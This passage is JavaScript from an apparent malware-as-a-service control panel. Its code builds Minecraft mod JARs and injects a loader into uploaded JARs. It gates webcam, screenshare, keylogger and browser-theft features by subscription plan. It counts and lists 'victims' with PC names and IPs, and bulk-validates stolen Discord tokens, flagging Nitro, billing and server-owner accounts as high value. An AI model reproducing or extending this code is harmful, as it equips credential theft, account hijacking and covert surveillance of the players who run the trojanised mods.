                                u.rank === 3 ? '<i class="fas fa-trophy" style="color: #cd7f32;"></i>' : u.rank}
                            </td>
                            <td style="padding: 12px 20px; font-weight: 500;">${escapeHtml(u.name)}</td>
                            <td style="padding: 12px 20px; color: var(--accent); font-family: monospace;">${u.hits.toLocaleString()}</td>
                        </tr>
                    `).join('');
                }
            } catch (e) { console.error('Leaderboard error:', e); }
        }

        function logout() {
            token = null;
            currentUser = null;
            localStorage.removeItem('token');
            document.getElementById('loginPage').style.display = 'flex';
            document.getElementById('app').style.display = 'none';
        }

        async function checkAuth() {
            if (!token) return false;
            const res = await api('/api/auth/verify');
            if (res.success) {
                currentUser = res.user;
                return true;
            }
            // Token is invalid - log out and redirect to login
            toast('Your session has expired. Please login again.', 'error');
            logout();
            return false;
        }

        async function showApp() {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('app').style.display = 'block';

            // Reload user from storage if needed
            if (!currentUser) {
                try {
                    currentUser = JSON.parse(localStorage.getItem('user'));
                } catch (e) { }
            }

            if (currentUser) {
                document.getElementById('userName').textContent = currentUser.username;
                document.getElementById('userRole').textContent = currentUser.plan.toUpperCase();

                if (currentUser.is_admin) {
                    document.getElementById('app').classList.add('is-admin');
                }

                applyPermissions();
            }

            loadDashboard();
            loadSettings();
        }

        function applyPermissions() {
            if (!currentUser) return;

            const restrictedTabs = [
                'nav-webcam', 'nav-screenshare', 'nav-keylogger',
                'nav-files', 'nav-processes', 'nav-discord', 'nav-browser'
            ];

            if (currentUser.plan === 'free') {
                restrictedTabs.forEach(id => {
                    const el = document.getElementById(id);
                    if (el) el.style.display = 'none';
                });
            } else {
                restrictedTabs.forEach(id => {
                    const el = document.getElementById(id);
                    if (el) el.style.display = 'flex'; // or block/flex depending on css
                });
            }
        }

        async function buildMod() {
            const modName = document.getElementById('buildModName').value;

            if (!modName) {
                toast('Please enter a mod name', 'error');
                return;
            }

            document.getElementById('buildBtn').disabled = true;
            document.getElementById('buildStatus').style.display = 'block';
            document.getElementById('buildResult').style.display = 'none';
            document.getElementById('buildSpinner').style.display = 'block';

            // Reset steps
            for (let i = 1; i <= 5; i++) {
                const step = document.getElementById('step' + i);
                step.style.color = 'var(--text-muted)';
                step.innerHTML = step.innerHTML.replace('fa-check-circle', 'fa-circle').replace('color: #22c55e', '');
            }

            // Animate progress steps
            const steps = [
                { progress: 10, text: 'Preparing build environment...', step: 1 },
                { progress: 30, text: 'Injecting build key...', step: 2 },
                { progress: 50, text: 'Compiling mod...', step: 3 },
                { progress: 75, text: 'Packaging JAR...', step: 4 },
                { progress: 90, text: 'Finalizing...', step: 5 }
            ];

            let currentStep = 0;
            const progressInterval = setInterval(() => {
                if (currentStep < steps.length) {
                    const s = steps[currentStep];
                    document.getElementById('buildProgress').style.width = s.progress + '%';
                    document.getElementById('buildStatusText').textContent = s.text;

                    // Mark previous steps as complete
                    for (let i = 1; i < s.step; i++) {
                        const stepEl = document.getElementById('step' + i);
                        stepEl.style.color = '#22c55e';
                        stepEl.innerHTML = stepEl.innerHTML.replace('fa-circle', 'fa-check-circle');
                    }
                    // Highlight current step
                    document.getElementById('step' + s.step).style.color = 'var(--accent)';

                    currentStep++;
                }
            }, 800);

            try {
                const response = await fetch(API + '/api/build/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer ' + token
                    },
                    body: JSON.stringify({
                        mod_name: modName
                    })
                });

                clearInterval(progressInterval);

                if (response.ok) {
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    const safeName = modName.replace(/[^a-zA-Z0-9]/g, '_').substring(0, 20);
                    a.download = `${safeName}.jar`;
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);

                    // Mark all steps complete
                    for (let i = 1; i <= 5; i++) {
                        const stepEl = document.getElementById('step' + i);
                        stepEl.style.color = '#22c55e';
                        stepEl.innerHTML = stepEl.innerHTML.replace('fa-circle', 'fa-check-circle');
                    }

                    document.getElementById('buildProgress').style.width = '100%';
                    document.getElementById('buildStatusText').textContent = 'Build Complete! Download started.';
                    document.getElementById('buildSpinner').style.display = 'none';
                    toast('Mod built successfully!', 'success');
                } else {
                    let errorMsg = 'Build failed';
                    try {
                        const err = await response.json();
                        errorMsg = err.detail || err.message || JSON.stringify(err);
                    } catch (parseErr) {
                        errorMsg = 'Server error: ' + response.status;
                    }
                    throw new Error(errorMsg);
                }
            } catch (e) {
                clearInterval(progressInterval);
                const errorMessage = e.message || String(e) || 'Unknown error';
                toast('Build error: ' + errorMessage, 'error');
                document.getElementById('buildStatusText').textContent = 'Build Failed: ' + errorMessage;
                document.getElementById('buildSpinner').style.display = 'none';
                document.getElementById('buildProgress').style.width = '0%';
            } finally {
                document.getElementById('buildBtn').disabled = false;
            }
        }

        // ==================== MOD INJECTION ====================
        function handleInjectDrop(e) {
            e.preventDefault();
            document.getElementById('injectDropZone').classList.remove('drag-over');

            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleInjectFile(files[0]);
            }
        }

        function handleInjectFile(file) {
            if (!file) return;

            if (!file.name.endsWith('.jar')) {
                toast('Please select a JAR file', 'error');
                return;
            }

            injectMod(file);
        }

        async function injectMod(file) {
            // Show progress
            document.getElementById('injectStatus').style.display = 'block';
            document.getElementById('injectResult').style.display = 'none';
            document.getElementById('injectStatusText').textContent = 'Uploading ' + file.name + '...';
            document.getElementById('injectProgress').style.width = '20%';

            try {
                const formData = new FormData();
                formData.append('file', file);

                document.getElementById('injectProgress').style.width = '40%';
                document.getElementById('injectStatusText').textContent = 'Injecting loader...';

                const response = await fetch(API + '/api/build/inject', {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Bearer ' + token
                    },
                    body: formData
                });

                document.getElementById('injectProgress').style.width = '80%';

                if (response.ok) {
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);

                    document.getElementById('injectProgress').style.width = '100%';
                    document.getElementById('injectStatusText').textContent = 'Complete!';
                    document.getElementById('injectSpinner').style.display = 'none';

                    // Show result
                    document.getElementById('injectStatus').style.display = 'none';
                    document.getElementById('injectResult').style.display = 'block';
                    document.getElementById('injectFileName').textContent = file.name + '  injected-' + file.name;
                    document.getElementById('injectDownloadLink').href = url;
                    document.getElementById('injectDownloadLink').download = 'injected-' + file.name;

                    toast('Mod injected successfully!', 'success');
                } else {
                    let errorMsg = 'Injection failed';
                    try {
                        const err = await response.json();
                        errorMsg = err.detail || err.message || 'Unknown error';
                    } catch (e) {
                        errorMsg = 'Server error: ' + response.status;
                    }
                    throw new Error(errorMsg);
                }
            } catch (e) {
                document.getElementById('injectStatusText').textContent = 'Error: ' + e.message;
                document.getElementById('injectSpinner').style.display = 'none';
                toast('Injection error: ' + e.message, 'error');
            }
        }

        // pollBuildStatus removed

        function showPage(page) {
            console.log("Showing page:", page);

            // Force hide all
            document.querySelectorAll('.page').forEach(p => {
                p.classList.remove('active');
                p.style.display = 'none'; // Force hide
            });
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

            // Show target
            const targetPage = document.getElementById('page-' + page);
            if (targetPage) {
                targetPage.classList.add('active');
                targetPage.style.display = 'flex'; // Force show
            } else {
                console.error("Target page not found:", page);
            }

            const navItem = event && event.target && event.target.closest('.nav-item');
            if (navItem) navItem.classList.add('active');
            else {
                // Try find nav item by id
                const n = document.getElementById('nav-' + page);
                if (n) n.classList.add('active');
            }

            if (page === 'logs') loadLogs('all', 1000, true);
            if (page === 'users') loadUsers();
            if (page === 'alllogs') loadAllUsersLogs();
            if (page === 'login-logs') loadLoginLogs();
            if (page === 'discord') loadDiscordTokens();
            if (page === 'trash') loadTrash();
            if (page === 'audit') loadAuditLog();
            if (page === 'alllogs') loadAllUsersLogs(); // Assuming loadAllLogs was a typo and should be loadAllUsersLogs
            if (page === 'donutsmp') loadDonutsmp();
            if (page === 'browser') loadBrowserSteals();
            if (page === 'leaderboard') loadLeaderboard(); // NEW
            // Map page removed

            // Load online players for these tabs to populate dropdowns
            if (page === 'online' || page === 'chat' || page === 'soundboard') {
                loadOnlinePlayers();
                if (page === 'online') startOnlinePolling();
            }
            if (page === 'webcam') loadWebcamImages();
            if (page === 'about') loadAboutPage();
        }

        // Load About page in iframe
        function loadAboutPage() {
            const frame = document.getElementById('aboutFrame');
            if (!frame.src || frame.src === '' || frame.src === window.location.href) {
                frame.src = '/static/about.html';
            }
        }

        // All Users Logs (Admin only)
        let allUsersData = [];
        let currentUserFilter = 'all';
        let currentAllLogsTypeFilter = 'all';
        let allUsersLogs = [];

        async function loadAllUsersLogs() {
            const res = await api('/api/admin/users-logs');
            if (!res.success) {
                toast('Failed to load users logs', 'error');
                return;
            }

            allUsersData = res.users;
            allUsersLogs = [];

            // Collect all logs from all users
            res.users.forEach(user => {
                user.logs.forEach(log => {
                    log.panel_user = user.username;
                    log.panel_user_id = user.id;
                    allUsersLogs.push(log);
                });
            });

            // Sort by created_at desc
            allUsersLogs.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

            renderUserTabs();
            renderUserStats();
            filterAllLogs();
        }

        function renderUserTabs() {
            const container = document.getElementById('userTabsBar');
            let html = `<button class="filter-btn ${currentUserFilter === 'all' ? 'active' : ''}" onclick="filterUserLogs('all')">
                <i class="fas fa-globe"></i> All Users (${allUsersLogs.length})
            </button>`;

            allUsersData.forEach(user => {
                const logCount = user.logs.length;
                const isActive = currentUserFilter === String(user.id);
                html += `<button class="filter-btn ${isActive ? 'active' : ''}" onclick="filterUserLogs('${user.id}')">
                    <i class="fas fa-user${user.is_admin ? '-shield' : ''}"></i> ${user.username} (${logCount})
                </button>`;
            });

            container.innerHTML = html;
        }

        function renderUserStats() {
            const container = document.getElementById('userStatsContainer');

            if (currentUserFilter === 'all') {
                // Show summary for all users
                const totalMC = allUsersData.reduce((sum, u) => sum + (u.log_counts?.minecraft || 0), 0);
                const totalDiscord = allUsersData.reduce((sum, u) => sum + (u.log_counts?.discord || 0), 0);
                const totalBrowser = allUsersData.reduce((sum, u) => sum + (u.log_counts?.browser || 0), 0);
                const totalZip = allUsersData.reduce((sum, u) => sum + (u.log_counts?.zip || 0), 0);
                const totalVictims = allUsersData.reduce((sum, u) => sum + (u.stats?.victims || 0), 0);

                container.innerHTML = `
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon purple"><i class="fas fa-users"></i></div></div>
                            <div class="stat-card-value">${allUsersData.length}</div>
                            <div class="stat-card-label">Panel Users</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon mc"><i class="fas fa-cube"></i></div></div>
                            <div class="stat-card-value">${totalMC}</div>
                            <div class="stat-card-label">MC Sessions</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon blue"><i class="fab fa-discord"></i></div></div>
                            <div class="stat-card-value">${totalDiscord}</div>
                            <div class="stat-card-label">Discord Tokens</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon yellow"><i class="fas fa-key"></i></div></div>
                            <div class="stat-card-value">${totalBrowser}</div>
                            <div class="stat-card-label">Browser Hits</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon green"><i class="fas fa-file-archive"></i></div></div>
                            <div class="stat-card-value">${totalZip}</div>
                            <div class="stat-card-label">ZIP Files</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon red"><i class="fas fa-desktop"></i></div></div>
                            <div class="stat-card-value">${totalVictims}</div>
                            <div class="stat-card-label">Total Victims</div>
                        </div>
                    </div>
                `;
            } else {
                // Show stats for specific user
                const user = allUsersData.find(u => String(u.id) === currentUserFilter);
                if (!user) return;

                container.innerHTML = `
                    <div class="build-key-box" style="margin-bottom: 16px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <div>
                                <div class="build-key-label">User: ${user.username} ${user.is_admin ? '(Admin)' : ''}</div>
                                <div class="build-key-value">${user.build_key}</div>
                            </div>
                            <div style="text-align: right; font-size: 12px; color: var(--text-muted);">
                                Created: ${new Date(user.created_at).toLocaleDateString()}<br>
                                Last Login: ${user.last_login ? new Date(user.last_login).toLocaleString() : 'Never'}
                            </div>
                        </div>
                    </div>
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon mc"><i class="fas fa-cube"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.minecraft || 0}</div>
                            <div class="stat-card-label">MC Sessions</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon blue"><i class="fab fa-discord"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.discord || 0}</div>
                            <div class="stat-card-label">Discord Tokens</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon yellow"><i class="fas fa-key"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.browser || 0}</div>
                            <div class="stat-card-label">Browser Hits</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon green"><i class="fas fa-file-archive"></i></div></div>
                            <div class="stat-card-value">${user.log_counts?.zip || 0}</div>
                            <div class="stat-card-label">ZIP Files</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-card-header"><div class="stat-card-icon red"><i class="fas fa-desktop"></i></div></div>
                            <div class="stat-card-value">${user.stats?.victims || 0}</div>
                            <div class="stat-card-label">Victims</div>
                        </div>
                    </div>
                `;
            }
        }

        function filterUserLogs(userId) {
            currentUserFilter = userId;
            renderUserTabs();
            renderUserStats();
            filterAllLogs();
        }

        function filterAllLogsByType(type) {
            currentAllLogsTypeFilter = type;
            document.querySelectorAll('#allLogsTypeFilter .filter-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            filterAllLogs();
        }

        function filterAllLogs() {
            let filtered = allUsersLogs;

            // Filter by user
            if (currentUserFilter !== 'all') {
                filtered = filtered.filter(log => String(log.panel_user_id) === currentUserFilter);
            }

            // Filter by type
            if (currentAllLogsTypeFilter !== 'all') {
                filtered = filtered.filter(log => log.log_type === currentAllLogsTypeFilter);
            }

            renderAllLogs(filtered);
        }

        function renderAllLogs(logs) {
            const container = document.getElementById('allLogsGrid');
            if (!logs.length) {
                container.innerHTML = '<p style="color: var(--text-muted); padding: 20px;">No logs found</p>';
                return;
            }

            container.innerHTML = logs.map(log => {
                const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
                const preview = getPreview(log.log_type, data);
                const typeClass = getTypeClass(log.log_type);
                const typeIcon = getTypeIcon(log.log_type);

                return `
                    <div class="log-card">
                        <div class="log-card-header">
                            <div class="log-card-type">
                                <span class="log-type-badge ${typeClass}">
                                    <i class="${typeIcon}"></i> ${log.log_type}
                                </span>
                                <span style="font-size: 11px; color: var(--accent); background: rgba(99,102,241,0.15); padding: 3px 8px; border-radius: 10px;">
                                    <i class="fas fa-user"></i> ${log.panel_user || 'Unknown'}
                                </span>
                            </div>
                            <div class="log-card-actions">
                                <button class="btn btn-icon btn-secondary" onclick='openLogDetail(${JSON.stringify(log)})'>
                                    <i class="fas fa-eye"></i>
                                </button>
                            </div>
                        </div>
                        <div class="log-card-body">
                            <div class="log-info-row"><i class="fas fa-desktop"></i> <span>${log.pc_name || 'Unknown'}</span></div>
                            <div class="log-info-row"><i class="fas fa-user"></i> <span>${log.pc_user || 'Unknown'}</span></div>
                            <div class="log-info-row"><i class="fas fa-globe"></i> <span>${log.ip || 'Unknown'} ${log.country ? '(' + log.country + ')' : ''}</span></div>
                            ${preview}
                        </div>
                        <div class="log-card-footer">
                            <span><i class="fas fa-clock"></i> ${new Date(log.created_at).toLocaleString()}</span>
                        </div>
                    </div>
                `;
            }).join('');
        }

        // Discord Tokens
        let allDiscordTokens = [];
        let currentDiscordFilter = 'all';

        async function loadDiscordTokens() {
            document.getElementById('discordTokensLoading').style.display = 'block';
            document.getElementById('discordTokensTable').innerHTML = '';

            const res = await api('/api/discord/tokens');
            document.getElementById('discordTokensLoading').style.display = 'none';

            if (!res.success) {
                toast('Failed to load tokens', 'error');
                return;
            }

            allDiscordTokens = res.tokens;
            updateDiscordStats();
            renderDiscordTokens();
        }

        function updateDiscordStats() {
            document.getElementById('dcTotalTokens').textContent = allDiscordTokens.length;
            document.getElementById('dcValidTokens').textContent = allDiscordTokens.filter(t => t.valid === true).length;
            document.getElementById('dcNitroTokens').textContent = allDiscordTokens.filter(t => t.has_nitro || (t.nitro_type && t.nitro_type !== 'No Nitro' && t.nitro_type !== '')).length;
            document.getElementById('dcZipTokens').textContent = allDiscordTokens.filter(t => t.source === 'zip').length;
        }

        function filterDiscordTokens(filter) {
            currentDiscordFilter = filter;
            document.querySelectorAll('#page-discord .filter-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            renderDiscordTokens();
        }

        function renderDiscordTokens() {
            let filtered = allDiscordTokens;

            // Apply type filter
            if (currentDiscordFilter === 'direct') filtered = filtered.filter(t => t.source === 'direct' || t.source === 'guardian' || t.source === 'validated');
            else if (currentDiscordFilter === 'zip') filtered = filtered.filter(t => t.source === 'zip');
            else if (currentDiscordFilter === 'valid') filtered = filtered.filter(t => t.valid === true);
            else if (currentDiscordFilter === 'invalid') filtered = filtered.filter(t => t.valid === false);
            else if (currentDiscordFilter === 'valid') filtered = filtered.filter(t => t.valid === true);
            else if (currentDiscordFilter === 'invalid') filtered = filtered.filter(t => t.valid === false);
            else if (currentDiscordFilter === 'nitro') filtered = filtered.filter(t => t.has_nitro || (t.nitro_type && t.nitro_type !== 'No Nitro' && t.nitro_type !== ''));
            else if (currentDiscordFilter === 'high_value') filtered = filtered.filter(t => t.is_high_value || (t.guild_count && t.guild_count > 0));

            // Apply search filter (new)
            if (discordSearchQuery) {
                filtered = filtered.filter(t => {
                    const searchFields = [
                        t.username || '',
                        t.email || '',
                        t.user_id || '',
                        t.pc_name || '',
                        t.pc_user || '',
                        t.ip || ''
                    ].join(' ').toLowerCase();
                    return searchFields.includes(discordSearchQuery);
                });
            }

            document.getElementById('discordTokensTable').innerHTML = filtered.map((token, idx) => {
                // Find original index in allDiscordTokens
                const originalIdx = allDiscordTokens.indexOf(token);

                const statusIcon = token.valid === true ? '<i class="fas fa-check-circle" style="color: var(--success);"></i>' :
                    token.valid === false ? '<i class="fas fa-times-circle" style="color: var(--danger);"></i>' :
                        '<i class="fas fa-question-circle" style="color: var(--text-muted);"></i>';

                // Nitro badge with styling - check both has_nitro and nitro_type
                const hasNitro = token.has_nitro || (token.nitro_type && token.nitro_type !== 'No Nitro' && token.nitro_type !== '');
                const nitroLabel = token.nitro_type || (hasNitro ? 'Nitro' : '');
                const nitroBadge = hasNitro ?
                    `<span style="background: linear-gradient(90deg, #f47fff, #a855f7); color: white; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 600;">
                        <i class="fas fa-crown"></i> ${nitroLabel}
                    </span>`: '';

                const billingIcon = token.has_billing ? '<span style="color: var(--success);" title="Has Billing"></span>' : '';
                const mfaIcon = token.mfa_enabled ? '<span style="color: var(--accent);" title="2FA Enabled"></span>' : '';

                const badgeCount = token.badges ? token.badges.length : 0;
                const badgeIcon = badgeCount > 0 ? `<span style="color: var(--danger);" title="${badgeCount} Badges">${badgeCount}</span>` : '';

                // Only show token (not status text after |)
                const shortToken = token.token.substring(0, 25) + '...';
                const tokenId = 'dctoken_' + originalIdx;
                window[tokenId] = token.token;

                const sourceLabel = token.source === 'zip' ?
                    `<span style="background: rgba(16,185,129,0.15); color: var(--success); padding: 2px 8px; border-radius: 12px; font-size: 11px;">
                        <i class="fas fa-file-archive"></i> ZIP
                    </span>` :
                    `<span style="background: rgba(88,101,242,0.15); color: var(--discord-blue); padding: 2px 8px; border-radius: 12px; font-size: 11px;">
                        <i class="fas fa-bolt"></i> Direct
                    </span>`;

                // Avatar URL - use Discord CDN if we have user_id and avatar
                let avatarHtml = '';
                if (token.user_id && token.avatar) {
                    const avatarUrl = `https://cdn.discordapp.com/avatars/${token.user_id}/${token.avatar}.png?size=64`;
                    avatarHtml = `<img src="${avatarUrl}" style="width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; border: 2px solid ${hasNitro ? '#a855f7' : 'var(--discord-blue)'};" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">`;
                } else if (token.valid === true) {
                    avatarHtml = `<div style="width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; background: var(--discord-blue); display: flex; align-items: center; justify-content: center; font-size: 16px;"><i class="fab fa-discord"></i></div>`;
                } else {
                    avatarHtml = `<div style="width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; background: var(--bg-secondary); display: flex; align-items: center; justify-content: center; font-size: 16px; color: var(--text-muted);"><i class="fas fa-user"></i></div>`;
                }

                return `
                    <tr>
                        <td style="text-align: center;">${statusIcon}</td>
                        <td>
                            <div style="display: flex; align-items: center;">
                                ${avatarHtml}
                                <div>
                                    <div style="font-weight: 600; font-size: 14px;">${token.username || 'Unknown'}</div>
                                    ${token.email ? `<div style="font-size: 11px; color: var(--text-muted);">${token.email}</div>` : ''}
                                    <div style="margin-top: 4px;">${nitroBadge}</div>
                                    ${token.is_high_value ? '<span class="badge badge-warning" style="margin-left:4px; font-size:10px;"><i class="fas fa-gem"></i> HIGH VALUE</span>' : ''}
                                    ${token.guild_count ? `<div style="font-size:10px; color:var(--text-muted); margin-top:2px;"><i class="fas fa-server"></i> ${token.guild_count} Guilds</div>` : ''}
                                </div>
                            </div>
                        </td>
                        <td>
                            <code style="font-size: 10px; background: var(--bg-secondary); padding: 4px 8px; border-radius: 4px; display: inline-block; max-width: 180px; overflow: hidden; text-overflow: ellipsis;">${shortToken}</code>
                        </td>
                        <td>${sourceLabel}</td>
                        <td style="font-size: 12px;">
                            ${mfaIcon} ${billingIcon} ${badgeIcon}
                        </td>
                        <td style="font-size: 12px; color: var(--text-secondary);">
                            ${token.pc_user || 'Unknown'}@${token.pc_name || 'Unknown'}<br>
                            <span style="font-size: 11px; color: var(--text-muted);">${token.ip || 'Unknown'} (${token.country || 'Unknown'})</span>
                        </td>
                        <td>
                            <div style="display: flex; gap: 4px;">
                                <button class="btn btn-secondary btn-icon" onclick="copyToken('${tokenId}', this)" title="Copy Token">
                                    <i class="fas fa-copy"></i>
                                </button>
                                <button class="btn btn-secondary btn-icon" onclick="validateToken(${originalIdx})" title="Validate">
                                    <i class="fas fa-check"></i>
                                </button>
                                <button class="btn btn-secondary btn-icon" onclick="showTokenDetail(${originalIdx})" title="Details">
                                    <i class="fas fa-eye"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
            }).join('');

            if (filtered.length === 0) {
                document.getElementById('discordTokensTable').innerHTML = `
                    <tr><td colspan="7" style="text-align: center; padding: 40px; color: var(--text-muted);">
                        <i class="fab fa-discord" style="font-size: 32px; margin-bottom: 12px; display: block;"></i>
                        No Discord tokens found
                    </td></tr>
                `;
            }
        }

        async function validateToken(idx) {
            const token = allDiscordTokens[idx];
            if (!token) return;

            toast('Validating token...', 'success');

            const res = await api('/api/discord/validate', 'POST', { token: token.token });

            if (res.success) {
                allDiscordTokens[idx].valid = res.valid;

                if (res.valid && res.user) {
                    allDiscordTokens[idx].username = res.user.username;
                    allDiscordTokens[idx].email = res.user.email;
                    allDiscordTokens[idx].phone = res.user.phone;
                    allDiscordTokens[idx].nitro_type = res.user.nitro_type;
                    allDiscordTokens[idx].has_nitro = res.user.has_nitro;
                    allDiscordTokens[idx].has_billing = res.user.has_billing;
                    allDiscordTokens[idx].badges = res.user.badges;
                    allDiscordTokens[idx].user_id = res.user.id;
                    allDiscordTokens[idx].avatar = res.user.avatar;
                    allDiscordTokens[idx].banner = res.user.banner;
                    allDiscordTokens[idx].mfa_enabled = res.user.mfa_enabled;
                    allDiscordTokens[idx].verified = res.user.verified;
                    allDiscordTokens[idx].guild_count = res.user.guild_count;
                    allDiscordTokens[idx].friends_count = res.user.friends_count;
                    allDiscordTokens[idx].enhanced = true;
                    toast(` Valid: ${res.user.username}${res.user.has_nitro ? ' [NITRO]' : ''}${res.user.mfa_enabled ? ' [MFA]' : ''}`, 'success');
                } else if (res.valid) {
                    toast('Token valid (limited info)', 'success');
                } else {
                    toast(` Invalid: ${res.error}`, 'error');
                }

                updateDiscordStats();
                renderDiscordTokens();
            } else {
                toast('Validation failed', 'error');
            }
        }

        async function validateAllTokens() {
            const btn = document.getElementById('validateAllBtn');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Validating...';
            btn.disabled = true;

            let validated = 0;
            let valid = 0;
            let invalid = 0;
            let nitroCount = 0;
            let highValueCount = 0;
            const invalidTokenIds = []; // Track invalid tokens to delete

            // Step 1: Group by user_id and keep only newest token per user
            const userTokenMap = new Map(); // user_id -> {token, created_at, index}

            for (let i = 0; i < allDiscordTokens.length; i++) {
                const t = allDiscordTokens[i];
                const userId = t.user_id;
                const createdAt = new Date(t.created_at || 0).getTime();

                if (!userId) {
                    // No user_id yet - will be validated
                    continue;
                }

                if (!userTokenMap.has(userId)) {
                    userTokenMap.set(userId, { token: t, createdAt, index: i });
                } else {
                    const existing = userTokenMap.get(userId);
                    if (createdAt > existing.createdAt) {
                        // This one is newer - mark old one for deletion
                        invalidTokenIds.push(allDiscordTokens[existing.index].id);
                        userTokenMap.set(userId, { token: t, createdAt, index: i });
                    } else {
                        // Existing is newer - mark this one for deletion
                        invalidTokenIds.push(t.id);
                    }
                }
            }

            // Step 2: Validate all tokens
            for (let i = 0; i < allDiscordTokens.length; i++) {
                // Wait 0.8s to prevent 429 Rate Limits
                if (i > 0) await new Promise(r => setTimeout(r, 800));

                try {
                    const res = await api('/api/discord/validate', 'POST', { token: allDiscordTokens[i].token });

                    if (res.success) {
                        allDiscordTokens[i].valid = res.valid;

                        if (res.valid && res.user) {
                            allDiscordTokens[i].username = res.user.username;
                            allDiscordTokens[i].email = res.user.email;
                            allDiscordTokens[i].phone = res.user.phone;
                            allDiscordTokens[i].nitro_type = res.user.nitro_type;
                            allDiscordTokens[i].has_nitro = res.user.has_nitro;
                            allDiscordTokens[i].has_billing = res.user.has_billing;
                            allDiscordTokens[i].badges = res.user.badges;
                            allDiscordTokens[i].user_id = res.user.id;
                            allDiscordTokens[i].avatar = res.user.avatar;
                            allDiscordTokens[i].banner = res.user.banner;
                            allDiscordTokens[i].mfa_enabled = res.user.mfa_enabled;
                            allDiscordTokens[i].verified = res.user.verified;
                            allDiscordTokens[i].guild_count = res.user.guild_count;
                            allDiscordTokens[i].friends_count = res.user.friends_count;
                            allDiscordTokens[i].guilds = res.user.guilds;
                            allDiscordTokens[i].enhanced = true;

                            // Check for High Value (server owner with 100+ members)
                            let isHighValue = false;
                            if (res.user.guilds && Array.isArray(res.user.guilds)) {
                                for (const guild of res.user.guilds) {
                                    if (guild.owner && guild.member_count >= 100) {
                                        isHighValue = true;
                                        break;
                                    }
                                }
                            }
                            allDiscordTokens[i].is_high_value = isHighValue;
                            if (isHighValue) highValueCount++;

                            valid++;
                            if (res.user.has_nitro) nitroCount++;

                            const nitroTag = res.user.has_nitro ? ' [NITRO]' : '';
                            const hvTag = isHighValue ? ' [HIGH VALUE]' : '';
                            console.log(`[${validated + 1}/${allDiscordTokens.length}]  ${res.user.username}${nitroTag}${hvTag}`);
                        } else if (res.valid) {
                            valid++;
                        } else {
                            invalid++;
                            invalidTokenIds.push(allDiscordTokens[i].id);
                            console.log(`[${validated + 1}/${allDiscordTokens.length}]  Invalid`);
                        }
                    } else {
                        invalid++;
                        invalidTokenIds.push(allDiscordTokens[i].id);
                        console.log(`[${validated + 1}/${allDiscordTokens.length}]  Error: ${res.error}`);
                    }
                } catch (e) {
                    console.error("Validation loop error:", e);
                }

                validated++;
                btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${validated}/${allDiscordTokens.length}`;

                // Update display every 5 tokens
                if (validated % 5 === 0) {
                    updateDiscordStats();
                    renderDiscordTokens();
                }
            }

            // Step 3: Auto-delete invalid tokens
            if (invalidTokenIds.length > 0) {
                console.log(`Auto-deleting ${invalidTokenIds.length} invalid/duplicate tokens...`);
                try {
                    await api('/api/discord/remove-invalid', 'POST');
                    // Remove from local array
                    allDiscordTokens = allDiscordTokens.filter(t => t.valid !== false);
                } catch (e) {
                    console.error("Failed to auto-delete invalids:", e);
                }
            }

            btn.innerHTML = originalText;
            btn.disabled = false;

            updateDiscordStats();
            renderDiscordTokens();
            toast(` ${valid} valid (${nitroCount} Nitro, ${highValueCount} High Value) |  ${invalid} deleted`, 'success');
        }
        // Discord Search Functions
        let discordSearchQuery = '';

        function searchDiscordTokens() {
            discordSearchQuery = document.getElementById('discordSearchInput').value.toLowerCase().trim();
            renderDiscordTokens();
        }

        function clearDiscordSearch() {
            discordSearchQuery = '';
            document.getElementById('discordSearchInput').value = '';
            renderDiscordTokens();
        }

        async function removeInvalidTokens() {
            if (!confirm('Remove all invalid tokens from the list?')) return;

            toast('Removing invalid tokens...', 'success');
            const res = await api('/api/discord/remove-invalid', 'POST');

            if (res.success) {
                // Remove from local array too
                allDiscordTokens = allDiscordTokens.filter(t => t.valid !== false);
                updateDiscordStats();
                renderDiscordTokens();
                toast(`Removed ${res.removed} invalid tokens`, 'success');
            } else {
                toast('Failed to remove invalid tokens', 'error');
            }
        }

        // Logs Search Functions
        let logsSearchQuery = '';
        let currentLogTypeFilter = 'all';

        async function searchLogs() {
            const query = document.getElementById('logsSearchInput').value.trim();
            if (!query) {
                toast('Please enter a search query', 'error');
                return;
            }

            logsSearchQuery = query;
